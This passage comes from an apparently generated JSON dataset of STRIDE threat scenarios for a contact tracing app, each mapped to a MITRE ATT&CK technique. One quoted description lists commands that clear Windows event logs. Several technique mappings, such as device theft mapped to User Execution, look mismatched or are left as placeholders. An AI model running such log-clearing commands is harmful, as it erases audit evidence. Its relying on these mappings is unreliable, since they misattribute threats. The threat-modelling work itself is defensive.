Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)",
                "id": "attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0",
                "technique_id": "T1486"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the mobile application to gain administrative access to the central server.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerability exists in the mobile application's code.",
                    "Role": "Application",
                    "Condition": "Unpatched or unknown vulnerability."
                },
                {
                    "Assumption": "Attackers can identify and exploit this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Access to tools or knowledge to exploit the flaw."
                },
                {
                    "Assumption": "Central server does not have robust access controls or monitoring.",
                    "Role": "System",
                    "Condition": "Weak security configuration on the server."
                }
            ],
            "Potential Impact": "Compromise of the central server, leading to potential data breaches and system manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability exploitation",
                "central server",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Cloud Administration Command",
                "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
                "id": "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7",
                "technique_id": "T1651"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user with legitimate access to the system elevates their privileges to access restricted areas of the application.",
            "Assumptions": [
                {
                    "Assumption": "Users have access to low-level functions of the application.",
                    "Role": "User",
                    "Condition": "Basic or regular user access."
                },
                {
                    "Assumption": "Application has misconfigured or inadequate access control mechanisms.",
                    "Role": "Application",
                    "Condition": "Weak access control."
                },
                {
                    "Assumption": "User can exploit these misconfigurations to gain higher privileges.",
                    "Role": "User",
                    "Condition": "Awareness and ability to exploit security weaknesses."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and critical application functions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access control",
                "authentication",
                "application"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a zero-day vulnerability to gain root access on user devices, manipulating data and interfering with the app's functionality.",
            "Assumptions": [
                {
                    "Assumption": "A zero-day vulnerability exists in the operating system or application.",
                    "Role": "System",
                    "Condition": "Unpatched or unknown security flaw."
                },
                {
                    "Assumption": "Attackers can discover and exploit this vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Advanced knowledge or tools for exploit."
                },
                {
                    "Assumption": "The device security cannot detect or mitigate the attack.",
                    "Role": "Device",
                    "Condition": "Lack of endpoint protection or outdated systems."
                }
            ],
            "Potential Impact": "Complete compromise of the device, data manipulation, and potential spread of malware.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "zero-day vulnerability",
                "root access",
                "mobile device"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "9",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates the central server to distribute malicious IDs.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Unsecured network communication"
                },
                {
                    "Assumption": "The system lacks mutual TLS authentication.",
                    "Role": "System",
                    "Condition": "No proper encryption measures"
                },
                {
                    "Assumption": "Users cannot verify server authenticity.",
                    "Role": "User",
                    "Condition": "No validation mechanism"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information and data integrity compromise.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "network",
                "spoofing",
                "server"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious application mimics the contact tracing app to collect user data.",
            "Assumptions": [
                {
                    "Assumption": "App stores lack strict verification.",
                    "Role": "App Store",
                    "Condition": "Weak vetting process"
                },
                {
                    "Assumption": "Users cannot distinguish between legitimate and malicious apps.",
                    "Role": "User",
                    "Condition": "Lack of information"
                },
                {
                    "Assumption": "The attacker has capability to design a similar interface.",
                    "Role": "Attacker",
                    "Condition": "Access to the original app's design"
                }
            ],
            "Potential Impact": "Exposure of user data and unauthorized data collection.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "malware",
                "fake app"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a user's device to manipulate proximity data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker is in physical proximity or has Bluetooth capabilities.",
                    "Role": "Attacker",
                    "Condition": "Nearby or strong signal"
                },
                {
                    "Assumption": "Lack of strong device authentication.",
                    "Role": "System",
                    "Condition": "Weak or no authentication protocols"
                },
                {
                    "Assumption": "The application does not validate device IDs.",
                    "Role": "Application",
                    "Condition": "No strict validation"
                }
            ],
            "Potential Impact": "Corruption of proximity data, leading to false exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "bluetooth",
                "impersonation",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters data being transmitted to the central server.",
            "Assumptions": [
                {
                    "Assumption": "Use of unencrypted communication channels.",
                    "Role": "System",
                    "Condition": "No encryption in place"
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Network proximity"
                },
                {
                    "Assumption": "The system does not verify data integrity.",
                    "Role": "System",
                    "Condition": "Lack of integrity checks"
                }
            ],
            "Potential Impact": "Data tampering, leading to inaccurate contact tracing and exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "network",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies log files to cover malicious activity.",
            "Assumptions": [
                {
                    "Assumption": "Insider has access to log files.",
                    "Role": "Insider",
                    "Condition": "Log access permissions not restricted"
                },
                {
                    "Assumption": "Lack of log file integrity checks.",
                    "Role": "System",
                    "Condition": "No integrity mechanisms"
                },
                {
                    "Assumption": "No monitoring for changes in log files.",
                    "Role": "System",
                    "Condition": "Lack of monitoring solutions"
                }
            ],
            "Potential Impact": "Loss of data integrity and potential concealment of malicious actions.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "insider threat",
                "data tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the mobile application to include malicious code.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the app source code or binary.",
                    "Role": "Attacker",
                    "Condition": "Weak access controls"
                },
                {
                    "Assumption": "No integrity checks on the application.",
                    "Role": "System",
                    "Condition": "No checksum or hash verification"
                },
                {
                    "Assumption": "Users download the malicious version of the app.",
                    "Role": "User",
                    "Condition": "No trusted download source"
                }
            ],
            "Potential Impact": "Execution of malicious activities and unauthorized access to sensitive information.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "application",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having consented to data upload after testing positive.",
            "Assumptions": [
                {
                    "Assumption": "No detailed logs of user consent actions.",
                    "Role": "System",
                    "Condition": "Inadequate logging policies"
                },
                {
                    "Assumption": "The system allows data uploads without thorough verification.",
                    "Role": "System",
                    "Condition": "Weak verification process"
                },
                {
                    "Assumption": "The application does not capture detailed user actions.",
                    "Role": "Application",
                    "Condition": "Lack of granular logging"
                }
            ],
            "Potential Impact": "Challenges in compliance verification and legal disputes.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "consent",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider alters the logs to erase traces of unauthorized data access.",
            "Assumptions": [
                {
                    "Assumption": "Insider has sufficient privileges to access logs.",
                    "Role": "Insider",
                    "Condition": "High privilege level"
                },
                {
                    "Assumption": "The system lacks secure audit mechanisms.",
                    "Role": "System",
                    "Condition": "Weak audit trails"
                },
                {
                    "Assumption": "No real-time monitoring of log access.",
                    "Role": "System",
                    "Condition": "Lack of monitoring"
                }
            ],
            "Potential Impact": "Loss of audit trail integrity and potential concealment of malicious access.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "log manipulation",
                "data tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies receiving an exposure notification after potential COVID-19 contact.",
            "Assumptions": [
                {
                    "Assumption": "No detailed recording of notification actions.",
                    "Role": "System",
                    "Condition": "Inadequate event logging"
                },
                {
                    "Assumption": "The system does not verify notification delivery.",
                    "Role": "System",
                    "Condition": "Lack of delivery verification"
                },
                {
                    "Assumption": "The notification data is not stored securely.",
                    "Role": "System",
                    "Condition": "Weak data security"
                }
            ],
            "Potential Impact": "Compromised exposure tracking and notification process.",
            "MITRE ATT&CK Keywords": [
                "notification",
                "user actions",
                "reputation"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability to access user location data.",
            "Assumptions": [
                {
                    "Assumption": "Presence of a known vulnerability in the application.",
                    "Role": "System",
                    "Condition": "Unpatched vulnerability"
                },
                {
                    "Assumption": "The attacker has the required exploitation tools.",
                    "Role": "Attacker",
                    "Condition": "Access to exploitation tools"
                },
                {
                    "Assumption": "Lack of encryption for sensitive data.",
                    "Role": "System",
                    "Condition": "Weak or no encryption"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive location data compromising user privacy.",
            "MITRE ATT&CK Keywords": [
                "exploitation",
                "vulnerability",
                "data leak"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider accesses user medical data without authorization.",
            "Assumptions": [
                {
                    "Assumption": "Insider has high-level access permissions.",
                    "Role": "Insider",
                    "Condition": "Excessive access rights"
                },
                {
                    "Assumption": "Lack of access control measures.",
                    "Role": "System",
                    "Condition": "Weak access controls"
                },
                {
                    "Assumption": "No audit trails to monitor access.",
                    "Role": "System",
                    "Condition": "Lack of monitoring"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive medical information.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data breach",
                "access control"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A user device is stolen, exposing sensitive contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "Device access is not properly secured.",
                    "Role": "User",
                    "Condition": "No device encryption or access controls"
                },
                {
                    "Assumption": "Sensitive data is stored on the device.",
                    "Role": "System",
                    "Condition": "Local data storage"
                },
                {
                    "Assumption": "The stolen device is not quickly deactivated.",
                    "Role": "User",
                    "Condition": "Slow response to device theft"
                }
            ],
            "Potential Impact": "Exposure of user interactions and potential COVID contacts compromising data privacy.",
            "MITRE ATT&CK Keywords": [
                "device theft",
                "data exposure",
                "user actions"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the central server with requests, causing downtime.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks rate-limiting mechanisms.",
                    "Role": "System",
                    "Condition": "No rate limits configured"
                },
                {
                    "Assumption": "The attacker can generate high volumes of traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to strong resources"
                },
                {
                    "Assumption": "Lack of network security measures.",
                    "Role": "System",
                    "Condition": "No DDoS protection"
                }
            ],
            "Potential Impact": "Disruption in system availability, affecting contact tracing operations.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
